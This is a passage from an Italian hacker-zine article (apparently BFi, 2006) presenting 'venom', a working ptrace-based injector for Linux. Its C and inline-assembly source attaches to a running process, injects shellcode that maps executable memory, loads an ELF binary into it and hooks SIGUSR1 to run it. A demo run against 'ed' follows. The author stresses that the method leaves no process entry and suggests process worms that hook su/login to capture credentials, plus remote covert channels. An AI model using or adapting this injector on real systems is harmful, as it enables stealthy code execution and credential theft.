+ed andare sul sicuro passiamo al programma come terzo arg la stringa 'noguess'.
+Alcune note: venom cerchera' l'elf da caricare con il nome 'inj' sotto la dir
+/home/sbudella/src/spe/, naturalmente cambiatela con un accorgimento: dovete
+inserire il path completo altrimenti il codice di spaghetti, una volta nello
+spazio della vittima, cerchera' l'elf da leggere nella dir in cui e' stata
+lanciata questa. E non chiedetemi file di configurazione, please... Inoltre
+ho avuto modo di testare il tutto sotto la Slackware 10, con ld versione
+2.15.90.0.3... quindi se avete problemi sapete cosa fare... ;-D nel
+frattempo fate i bravi (Castagna rulez).
+
+<-| spe/venom.c |->
+/*====================
+==	symbiotic process execution : venom.c
+==	PTRACE_ATTACH a program, then ask in its
+==	memory space to mmap a given size MAP_ANON
+==	region. Put binary code in this region from
+==	an elf file linked with a runtime generated 
+==	ld script. Set a new handler for the signal
+==	SIGUSR1, which makes the just loaded binary
+==	run asynchronously.
+==
+==	author : sbudella;
+==	contact : sbudella at gmail dot com;
+==	date : 13 aug 2006 - 17 sep 2006;
+==	description : README;
+==	usage: ./venom <pid> - run the loader in default mode;
+==	       ./venom <pid> noguess - run the loader with 
+==		disabled guessing mode (safe for 2.6 or if you cannot
+==		read /proc/pid/maps); 
+==
+==	copyright note :
+==	"THE MEZCAL-WARE LICENSE" :
+==	<sbudella at gmail dot com> wrote this file. As long as you retain
+==	this notice you can do whatever you want with this stuff.
+==	If we meet some day, and you think this stuff is worth it,
+==	you can buy me a mezcal bottle in return.
+==	sbudella
+====================*/
+
+#include <sys/reg.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/syscall.h>
+#include <linux/user.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+/* increase these two values as the size of the elf grows */ 
+#define ALLOC_SIZE			0x1000	
+/* this must be a little greater than ALLOC_SIZE, due to the
+   size of spaghetti() */ 
+#define	BSIZE				0x1100				
+						           	
+#define	DELTA_VALUE			0x80
+#define	SSIZE				512
+#define DEFAULT_ENTRY			"0x08048000"
+#define NULL_SPACE_TAG			"rw-p 00000000 00:00 0"
+#define LOCALE_STUFF_TAG01		"/usr/lib/locale"
+#define LOCALE_STUFF_TAG02		"LC_CTYPE"
+#define CREATE_RAW_LD_SCRIPT		"ld --verbose | head -188 > ld.script.raw"
+#define RAW_LD_SCRIPT_NM		"ld.script.raw"
+#define	FINAL_LD_SCRIPT_NM		"ld.script"
+#define	DATA_NOT_ALIGNED_TAG		".data : { *(.data) }\n"
+#define BSS_NOT_ALIGNED_TAG		".bss : { *(.bss) }\n"
+#define	TEXT_SECTION_TAG01		".text           :"
+#define TEXT_SECTION_TAG02		"{\n\t*(.text .stub .text.* .gnu.linkonce.t.*)\n"
+#define TEXT_SECTION_TAG03		"\t*(.gnu.warning)\n } =0x90909090\n"
+#define	LINK_CMD			"ld -static -T ld.script -o inj inj.o"
+#define NO_GUESSING_STR			"noguess"
+
+void get_data(pid_t pid,long addr,long *str,int len);
+void put_data(pid_t pid,long addr,void *vptr,int len);
+int dump_code(void (*fptr));
+void check_mmap_address(); 
+void spaghetti();
+
+char *injcode = 0;
+char *checkcode = 0;
+
+int main(int argc,char *argv[])
+{
+	int i,len,checklen;
+	pid_t pid;
+	char proc_fn[128],*s,*a,*b,*c;
+	struct user_regs_struct regs,old_regs;
+	long oeax,ebx,mmap_address = 0;
+	FILE *proc_maps,*raw_ld_script,*final_ld_script;
+	char nopsh[] = { 0x90,0x90 }; 
+	short fg = 0;
+
+	if(argc < 2) {
+		printf("mmap address guessing mode:\n");
+		printf("usage: %s <pid>\n",argv[0]);
+		printf("disable guessing mode:\n");
+		printf("usage: %s <pid> %s\n",argv[0],NO_GUESSING_STR);
+		exit(1);
+	}
+	
+	len = dump_code(spaghetti);
+	checklen = dump_code(check_mmap_address);
+
+	s = (char *)malloc(SSIZE);
+	a = b = c = NULL;
+
+	pid = atoi(argv[1]);
+	
+	sprintf(proc_fn,"/proc/%d/maps",pid);	
+
+	proc_maps = fopen(proc_fn,"r");
+	if(!proc_maps) {
+		perror("fopen");
+		exit(1);
+	}
+
+	if(argc == 3) 
+		if(!strcmp(argv[2],NO_GUESSING_STR))
+			goto NO_GUESSING; 
+
+	/* if the region to map is greater than 0x10000 mmap will 
+	   return the address just after LOCALE_STUFF_TAG02 region */
+	if(ALLOC_SIZE >= 0x10000)  
+		while(fgets(s,SSIZE,proc_maps) != NULL)
+			if(strstr(s,LOCALE_STUFF_TAG02)) {
+				sscanf(s,"%*lx-%lx",&mmap_address);
+				goto SCRIPT;	
+			}
+				
+	
+	/* ALLOC_SIZE < 0x10000 : check if the target has /usr/lib/locale
+	   memory regions; if so mmap_address is just after LOCALE_STUFF_TAG02 region */
+	while(fgets(s,SSIZE,proc_maps) != NULL)
+		if(strstr(s,LOCALE_STUFF_TAG01))
+			while(fgets(s,SSIZE,proc_maps) != NULL) 
+				if(strstr(s,LOCALE_STUFF_TAG02)) {
+					sscanf(s,"%*lx-%lx",&mmap_address);
+					fg = 1;
+					break;
+				}
+
+	/* this is the default mode; use it whenever the target
+	   doesn't have locale stuff shit and ALLOC_SIZE < 0x10000: 
+	   mmap address is just after the first rw-p free space region */
+	if(!fg) {
+		rewind(proc_maps);
+		while(fgets(s,SSIZE,proc_maps) != NULL)
+		if(strstr(s,NULL_SPACE_TAG)) {
+			sscanf(s,"%*lx-%lx",&mmap_address);
+			break;
+		}
+	}
+
+	goto SCRIPT;
+
+	/* we avoid guessing mmap address and try to mmap a region, then we
+	   PTRACE_SYSCALL the target and get mmap returned address: useful
+	   when you cannot read /proc/pid/maps or in 2.6 kernel situations */ 
+	NO_GUESSING:
+
+	/* i dont want to be alone */ 
+	printf("using no guessing mode;\n");
+	if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+	wait(NULL);
+
+	if(ptrace(PTRACE_GETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+
+	old_regs = regs;
+ 
+	/* soften the aggression injecting some nop bytes */
+	put_data(pid,regs.eip,nopsh,2 * sizeof(char));	
+	regs.eip += 2;
+
+	/* inject in the program flow the opcodes of check_mmap_address:
+	   it will mmap a region and the unmap it, so we can hook sys_mmap
+	   and the read its return value */
+	put_data(pid,regs.eip,checkcode,checklen * sizeof(char));
+	ptrace(PTRACE_SETREGS,pid,NULL,&regs);
+	ptrace(PTRACE_CONT,pid,NULL,NULL);
+
+	/* hook sys_mmap */
+	while(oeax != SYS_mmap) {	
+		ptrace(PTRACE_SYSCALL,pid,NULL,NULL);
+		oeax = ptrace(PTRACE_PEEKUSER,pid,4 * ORIG_EAX,NULL);
+	}
+	
+	/* hook sys_unmap and get ebx, that is the address returned by mmap */
+	ptrace(PTRACE_SYSCALL,pid,NULL,NULL);
+	ptrace(PTRACE_SYSCALL,pid,NULL,NULL);
+	/* oeax == SYS_unmap */
+	oeax = ptrace(PTRACE_PEEKUSER,pid,4 * ORIG_EAX,NULL);
+	mmap_address = ptrace(PTRACE_PEEKUSER,pid,4 * EBX,NULL);
+
+	ptrace(PTRACE_CONT,pid,NULL,NULL);
+
+	/* create the linker script */
+	SCRIPT:
+
+	fclose(proc_maps);
+
+	if(system(CREATE_RAW_LD_SCRIPT) < 0) 
+		exit(1);
+
+	raw_ld_script = fopen(RAW_LD_SCRIPT_NM,"r");
+	if(!raw_ld_script) {
+		perror("fopen");
+		exit(1);
+	}
+
+	final_ld_script = fopen(FINAL_LD_SCRIPT_NM,"w");
+	if(!final_ld_script) {
+		perror("fopen");
+		exit(1);
+	}
+
+	/* create the linker script using mmap_address - DELTA_VALUE as entry point;
+           make the .text and .data sections be adjacent */ 
+	while(fgets(s,SSIZE,raw_ld_script) != NULL)
+		if(strstr(s,"==="))
+			while(fgets(s,SSIZE,raw_ld_script) != NULL) {
+				a = strstr(s,DEFAULT_ENTRY);
+				if(a) {
+					for(;s != a;s++)
+						putc(*s,final_ld_script);
+					fprintf(final_ld_script,"0x%x",mmap_address - DELTA_VALUE);
+					b = strstr(&a[10],DEFAULT_ENTRY);
+					c = &a[10];
+					if(b) {
+						for(;c != b;c++)
+							putc(*c,final_ld_script);
+						fprintf(final_ld_script,"0x%x",mmap_address - DELTA_VALUE);
+					}
+					fprintf(final_ld_script,"%s",&c[10]);
+				} else {
+					if(strstr(s,TEXT_SECTION_TAG01)) {
+						fprintf(final_ld_script,"%s",s);
+						fprintf(final_ld_script,"%s",TEXT_SECTION_TAG02);
+						fprintf(final_ld_script,"%s",TEXT_SECTION_TAG03);
+						for(i = 0;i < 6;i++)
+							fgets(s,SSIZE,raw_ld_script);
+						fprintf(final_ld_script,"%s",DATA_NOT_ALIGNED_TAG);
+						fprintf(final_ld_script,"%s",BSS_NOT_ALIGNED_TAG);
+					}
+						
+					fprintf(final_ld_script,"%s",s);
+				}
+			}	
+
+	fclose(raw_ld_script);
+	unlink(RAW_LD_SCRIPT_NM);
+	fclose(final_ld_script);
+
+	/* link the obj file with the created script */ 
+	if(system(LINK_CMD) < 0) 
+		exit(1);
+
+	/* we must be together */
+	if(argc < 3) {
+		if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) < 0) {
+			perror("ptrace");
+			exit(1);
+		}
+		wait(NULL);
+	}
+
+	if(ptrace(PTRACE_GETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+
+	if(argc < 3)
+		old_regs = regs;
+
+	/* put in the program flow some nop bytes to soften the aggression */
+	put_data(pid,regs.eip,nopsh,2 * sizeof(char));
+
+	regs.eip += 2;
+
+	if(ptrace(PTRACE_SETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+
+	if(ptrace(PTRACE_CONT,pid,NULL,NULL) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+
+	wait(NULL);
+
+	if(ptrace(PTRACE_GETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+	
+	/* put in the program flow the opcodes of spaghetti : 
+	   it will ask the system to mmap a region in the memory space
+	   of the attached program */
+	printf("inserting elf code to execute;\n");
+	put_data(pid,regs.eip,injcode,len * sizeof(char));
+
+	/* hook sys_exit, thus avoiding the program shuts down */ 
+	while(1) {
+		ptrace(PTRACE_SYSCALL,pid,NULL,NULL);
+		oeax = ptrace(PTRACE_PEEKUSER,pid,4 * ORIG_EAX,NULL);
+		ebx = ptrace(PTRACE_PEEKUSER,pid,4 * EBX);
+		if(oeax == SYS_exit && ebx != 1)
+			goto RESTORE;	
+		/* if ebx == 1 we know that the new handler for SIGUSR1
+		   has not been installed, see SET_NEW_EIP */
+		if(ebx == 1)
+			goto SET_NEW_EIP;
+	}
+	
+	if(ptrace(PTRACE_SETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+	if(ptrace(PTRACE_CONT,pid,NULL,NULL) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+	wait(NULL);
+
+	/* restore the previous situation */
+	RESTORE:
+
+	printf("new handler for SIGUSR1 installed;\n");
+	printf("execute the elf binary with: kill -SIGUSR1 <pid>;\n");
+	regs = old_regs; 
+	ptrace(PTRACE_SETREGS,pid,NULL,&regs);
+	ptrace(PTRACE_CONT,pid,NULL,NULL);
+
+	ptrace(PTRACE_DETACH,pid,NULL,NULL); 
+
+	goto ALL_DONE;
+
+	/* use this only if the new handler for SIGUSR1 has not
+	   been installed: we try anyway to execute the elf bin
+           without asynchronous mode, thus setting regs.eip to
+	   the mmap returned address */
+	SET_NEW_EIP:
+
+	printf("new handler for SIGUSR1 not installed;\n");
+	printf("using direct execution default mode;\n"); 
+	printf("new eip @:%p;\n",mmap_address);
+	regs.eip = mmap_address;
+	if(ptrace(PTRACE_SETREGS,pid,NULL,&regs) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+	if(ptrace(PTRACE_CONT,pid,NULL,NULL) < 0) {
+		perror("ptrace");
+		exit(1);
+	}
+		
+	ptrace(PTRACE_DETACH,pid,NULL,NULL);
+
+	ALL_DONE:
+
+	return 0;
+
+}
+
+
+
+/* my very elegant version of ptrace get_data */
+void get_data(pid_t pid,long addr,long *str,int len)
+{
+	int i = 0;
+
+	while(i < len)
+		str[i++] = ptrace(PTRACE_PEEKDATA,pid,addr + i * 4,NULL);
+
+}
+
+
+
+/* credits : phrack59-0x08.txt */ 
+void put_data(pid_t pid,long addr,void *vptr,int len)
+{
+       	int i,count;
+       	long word;
+
+	i = count = 0;
+
+	while (count < len) {
+		memcpy(&word,vptr+count,sizeof(word));
+		word = ptrace(PTRACE_POKETEXT,pid,addr + count,word); 
+		if(word < 0) { 
+			perror("ptrace");
+			exit(1);
+		}
+
+		count += 4;
+	}
+}
+
+
+
+/* get opcodes from a function:
+   avoid getting the three stack prelude opcodes;
+   stop when 0xc3 (ret instruction opcode) is encountered */ 
+int dump_code(void (*fptr))
+{
+        int t;
+        char buf[BSIZE],*k;
+        char *s = (char *) fptr;      
+
+        memset(buf,0,BSIZE);
+        k = memccpy(buf,s,0xc3,BSIZE);          /* 0xc3 is the opcode for the ret instruction */
+
+        t = k - buf - 3;	/* 3 is for the stack prelude */ 
+
+	if(fptr == check_mmap_address) {
+		checkcode = (char *)malloc(t);
+		if(!checkcode) {
+			perror("malloc");
+			exit(1);
+		}
+		memset(checkcode,0,t);
+		memcpy(checkcode,&buf[3],t);
+
+		return t;
+	}
+
+        if(fptr == spaghetti) {
+		injcode = (char *)malloc(t);
+		if(!injcode) {
+			perror("malloc");
+			exit(1);
+		}
+		memset(injcode,0,t);
+        	memcpy(injcode,&buf[3],t);
+
+		return t;
+	}
+
+}
+
+
+
+/* check the mmap returned address: use only
+   if mmap address guessing is disabled */
+void check_mmap_address()
+{
+	/* mmap */
+	__asm__("jmp	mmap_arg_struct00");
+	__asm__("mmap00:");
+	__asm__("popl	%esi");
+	__asm__("movl	$0x5a,%eax");		/* sys_mmap */
+	__asm__("movl	%esi,%ebx");
+	__asm__("int	$0x80");
+	__asm__("cmpl	$0x0,%eax");
+	__asm__("jle	END00");
+
+	/* unmap the just mmapped region */ 
+	__asm__("xchg	%eax,%ebx");
+	__asm__("movl	$0x5b,%eax");		/* sys_unmap */
+	__asm__("movl	$0x1000,%ecx");		/* change this to ALLOC_SIZE */
+	__asm__("int	$0x80");
+	__asm__("cmpl	$0x0,%eax");
+	__asm__("jle	END00");
+
+	__asm__("END00:");
+	__asm__("int3");
+
+	__asm__("mmap_arg_struct00:");
+	__asm__("call	mmap00");
+	__asm__("args00:");			/* mmap_arg_struct */ 
+	__asm__(".long	0x0");			/* addr */
+	__asm__(".long	0x1000");		/* len = ALLOC_SIZE */ 
+	__asm__(".long	7");			/* prot = PROT_READ | PROT_WRITE | PROT_EXEC */
+	__asm__(".long	0x21");			/* flags = MAP_SHARED | MAP_ANON */
+	__asm__(".long	0");			/* fd ignored with MAP_ANON */
+	__asm__(".long	0");	 		/* offset ignored */
+
+}
+
+
+
+/* a hardcore example of spaghetti asm coding; 
+   use the old good jmp/call aleph1's method */ 
+void spaghetti()
+{
+	__asm__("START:");
+	/* ask for a region to be mmapped : we will
+	   put in it the opcodes of the elf to execute */ 
+	__asm__("jmp	mmap_arg_struct01");
+	__asm__("mmap01:");
+	__asm__("popl	%esi");
+	__asm__("movl	$0x5a,%eax");		/* sys_mmap */
+	__asm__("movl	%esi,%ebx");
+	__asm__("int	$0x80");
+	__asm__("cmpl	$0x0,%eax");
+	__asm__("jle	END01");
+	__asm__("pushl	%eax");			/* save the address returned by mmap */
+
+	/* open file to execute : 
+	   we cannot mmap it directly, since its path name 
+	   would be displayed in /proc/pid/mmaps */
+	__asm__("jmp	filename01");
+	__asm__("open01:");
+	__asm__("popl	%esi");
+	__asm__("movl	$0x5,%eax");		/* sys_open */
+	__asm__("movl	%esi,%ebx");
+	__asm__("xorl	%ecx,%ecx");
+	__asm__("xorl	%edx,%edx");
+	__asm__("int	$0x80");		
+	__asm__("cmpl	$0,%eax");
+	__asm__("jle	END01");
+
+	/* save the fd in ebx : we avoid using mov %eax,%ebx
+	   because its opcode contains 0xc3 and would be interpreted
+	   as a ret instruction by dump_code() */ 
+	__asm__("xchg	%eax,%ebx");		
+
+	/* lseek to the entry point offset : if you use
+	   the provided linker script usually it will be 0x1000 */
+	__asm__("movl	$0x13,%eax");		/* sys_lseek */ 
+	__asm__("movl	$0x1000,%ecx");
+	__asm__("movl	$0x0,%edx");
+	__asm__("int	$0x80");
+
+	/* read the binary file from the ep offset */
+	__asm__("jmp	buffer01");
+	__asm__("read01:");	
+	__asm__("popl	%esi");
+	__asm__("movl	$0x3,%eax");		/* sys_read */
+	__asm__("movl	%esi,%ecx");
+	/* increase this value as the size of the elf grows */
+	__asm__("movl	$0x1000,%edx");
+	__asm__("int	$0x80");
+	
+	/* close the file descriptor */
+	__asm__("movl	$0x6,%eax");
+	__asm__("int	$0x80");
+
+	__asm__("movl	%ecx,%ebx");		/* ebx = buffer */
+
+	/* memcpy the read bytes to the mmapped region */
+	__asm__("popl	%eax");			/* restore the mmap address */ 
+	__asm__("movl	%eax,%edi");
+	__asm__("movl	%ebx,%esi");
+	__asm__("cld");
+	__asm__("movl	$0x1000,%ecx");
+	__asm__("repz	movsb");	
+	__asm__("pushl	%eax");
+
+	/* we must check if there is already a non default handler
+	   for SIGUSR1: if so, we avoid setting the new one and
+	   ask the main program to execute the elf bin directly */  
+	__asm__("SIGUSR1_TEST:");
+	__asm__("movl	$0x30,%eax");		/* sys_signal */
+	__asm__("movl	$0xa,%ebx");		/* SIG_USR1 */
+	__asm__("xorl	%ecx,%ecx");		/* SIG_DFL */
+	__asm__("int	$0x80");
+	__asm__("xorl	%ebx,%ebx");
+	__asm__("incl	%ebx");			/* ebx = 1 */	
+	__asm__("cmpl	$0,%eax");
+	__asm__("jne	END01");
+		
+	/* we set a new handler for SIGUSR1 so when this signal
+	   intercepted our %eip turns to the mmap returned  
+	   address of the region where the elf binary is */
+	__asm__("SIGUSR1_NEW_HANDLER:");
+	__asm__("popl	%eax");
+	__asm__("movl	%eax,%ecx");		/* ecx = mmap address */
+	__asm__("movl	$0x30,%eax");		/* sys_signal */
+	__asm__("movl	$0xa,%ebx");		/* SIGUSR1 */		
+	__asm__("int	$0x80");
+
+	/* all done */
+	__asm__("END01:");
+	__asm__("xor	%eax,%eax");
+	__asm__("inc	%eax");			/* sys_exit */
+	__asm__("int	$0x80");
+
+	__asm__("mmap_arg_struct01:");
+	__asm__("call	mmap01");
+	__asm__("args01:");			/* mmap_arg_struct */ 
+	__asm__(".long	0x0");			/* addr */
+	__asm__(".long	0x1000");		/* len = ALLOC_SIZE */ 
+	__asm__(".long	7");			/* prot = PROT_READ | PROT_WRITE | PROT_EXEC */
+	__asm__(".long	0x21");			/* flags = MAP_SHARED | MAP_ANON */
+	__asm__(".long	0");			/* fd ignored with MAP_ANON */
+	__asm__(".long	0");	 		/* offset ignored */
+
+	__asm__("filename01:");
+	__asm__("call	open01");
+	/* elf binary to inject : remember to change this to your own */
+	__asm__(".string \"/home/sbudella/src/spe/inj\"");
+
+	__asm__("buffer01:");
+	__asm__("call	read01");
+	/* buffer to use for sys_read : increase this value */ 
+	__asm__(".space 0x1000, 0");		
+
+
+}
+
+<-X->
+
+Allego anche il codice di un semplicissimo programma di prova che potete
+utilizzare come verifica di funzionamento. Non fa niente di particolare, se
+non intercettare il SIGINT e stampare un messaggio a video. E' il codicillo
+piu' stupido che mi e' venuto in mente, ma tuttavia utile poiche' di piccole
+dimensioni e avente solo .text e .data section, quindi utilizzabile 
+con venom senza apportare alcuna modifica a questo. Per programmi piu' 
+complessi, modificate lo script del linker considerando le sezioni aggiuntive
+create da gcc. Ricordate di non linkare questo inj.asm, dato che e' compito del
+nostro loader venom, e mettetene l'object file nella stessa dir del loader.
+
+<-| spe/inj.asm |->
+;;;;;;;;;; stupid example code: hook SIGINT and print a message.
+;;;;;;;;;; nasm -f elf inj.asm
+;;;;; sbudella 2006
+ 
+section .data
+
+msg		db	'<caught>',0xa
+mlen		equ	$ - msg
+
+section .text
+global _start
+
+_start:
+lp00:
+	mov	eax,48				; sys_signal
+	mov	ebx,2				; sigint
+	mov	ecx,dword newhandler
+	int	0x80
+
+lp01:
+	jmp	lp01
+
+
+newhandler:
+	mov	eax,4
+	mov	ebx,0
+	mov	ecx,dword msg
+	mov	edx,mlen
+	int	0x80
+	jmp	lp00	
+
+<-X->
+
+Bene. Facciamo subito una prova. Innanzitutto cerchiamo nel sorgente di venom
+la stringa '/home/sbudella/src/spe', modifichiamola in modo da dire a spaghetti
+dove andare a prendere il nostro binario e compiliamo il programma. Poi  
+assembliamo il codice di prova e mettiamo il suo object file (inj.o) nella
+directory di venom. Scegliamo una vittima a caso: 
+
+sbudella@hannibal:~/src/spe$ ls
+inj.asm  inj.o  venom*  venom.c
+sbudella@hannibal:~/src/spe$ ps au | grep ed
+sbudella  1701  0.0  0.0  1568  480 pts/2    S+   19:03   0:00 ed
+sbudella  1708  0.0  0.1  1672  580 pts/1    S+   19:03   0:00 grep ed
+sbudella@hannibal:~/src/spe$ ./venom 1701
+inserting elf code to execute;
+new handler for SIGUSR1 installed;
+execute the elf binary with: kill -SIGUSR1 <pid>;
+sbudella@hannibal:~/src/spe$ kill -SIGUSR1 1701
+sbudella@hannibal:~/src/spe$ kill -2 1701
+sbudella@hannibal:~/src/spe$ kill -2 1701
+sbudella@hannibal:~/src/spe$ kill -9 1701
+sbudella@hannibal:~/src/spe$ 
+
+Vediamo l'output della vittima:
+
+sbudella@hannibal:~$ ed
+<caught>
+<caught>
+Killed
+sbudella@hannibal:~$ 
+
+Ottimo. Come potete vedere dal banale esempio proposto, abbiamo aggredito il
+povero e laconico 'ed', venom ci informa che e' riuscito ad installare il
+nuovo handler, quindi sappiamo che era impostato quello di default, mentre
+dietro le quinte ha fatto il linking necessario; abbiamo inviato un SIGUSR1
+alla vittima per attivare il codice in memoria del binario e subito dopo
+abbiamo spedito un paio di SIGINT e prontamente il codice di prova ha
+funzionato alla perfezione. Niente nodo nella task_struct, niente entry in
+proc, niente di niente. Naturalmente abbiamo considerato un caso semplice,
+con l'elf binary costituito solo da .text, .data e .bss section. Nei casi
+reali tocca modificare, come ho gia' avuto modo di dire, lo script e il
+loader stesso, comunque niente di assolutamente complicato (quindi largo a
+man ld, info ld).
+Le applicazioni di questa nuova tecnica possono essere tante, dalle
+piu' classiche alle piu' esotiche: pensate ad un process worm puro, che una
+volta caricato nello spazio di una vittima, ne scelga altre in modo random
+spostandosi da un processo all'altro in cerca di informazioni utili (su, login
+e fratelli: con ptrace possiamo hookare le syscall e leggerne gli argomenti).
+Oppure possiamo instaurare un covert channel tra la macchina compromessa ed
+un altro sistema, cosi' da leggere il codice del binario direttamente da remoto
+e farne il linking al volo. Come vedete, si possono fare tante porcate.
+Comunque il modo piu' semplice per evitare di avere grane in genere con questa
+esecuzione simbiotica potrebbe essere quello proposto da vecna in BFi-10[6]
+riguardo agli anti-debug tricks: disabilitare la chiamata ptrace, pregiudicando
+pero' l'utilizzo di software di diagnostica importanti tra i quali strace, gdb.
+Ma queste sono solo speculazioni senza alcun senso, nel frattempo provate a
+fare un software anti-sfiga e che mi faccia vincere alla lotteria.
+Tante grazie.
+
+***** Greetings.
+
+A Salvo&Ros: questo e' per voi, cuore mio, meritereste una vita migliore:
+"Quello che fate a Chiba e' una versione ridotta di quello che avreste
+fatto in qualunque altro posto. La sfortuna, come a volte capita, ti riduce
+ai minimi termini";
+
+Un ringraziamento speciale a tutto il BFi staff per l'attenzione dedicatami
+e per tutti i suggerimenti, consigli e nuove idee propostemi. Grazias.
+
+Inoltre un saluto agli amici di dietroleposte e dintorni, cryptestesia e 
+chiunque stia per partire o sia gia partito: nella vita l'importante e' non
+prendersi troppo sul serio.
+
+***** Riferimenti.
+
+[1] BFi-11: Smashing The Kernel for Fun and Profit - Dark Angel
+    http://bfi.s0ftpj.org/dev/BFi11-dev-11
+[2] The Design and Implementation of Userland Exec - the grugq
+    http://lists.grok.org.uk/pipermail/full-disclosure/attachments/20040101/fea4fb1f/ul_exec.txt
+[3] Phrack59-0x0c: Building Ptrace Injecting Shellcode - anonymous
+    http://www.phrack.com/archives/59/p59-0x0c.txt
+[4] BFi-11: Ptrace for Fun and Profit - xenion
+    http://bfi.s0ftpj.org/dev/BFi11-dev-13
+[5] Executable and Linkable Format Specification - Brian Raiter
+    http://www.muppetlabs.com/~breadbox/software/ELF.txt
+[6] BFi-10: Analisi Virus per Linux - vecna
+    http://www.s0ftpj.org/bfi/online/bfi10/BFi10-17.html
+Reversing and Asm Coding for Linux: http://racl.oltrelinux.com 
+
+
+================================================================================
+------------------------------------[ EOF ]-------------------------------------
+================================================================================
+
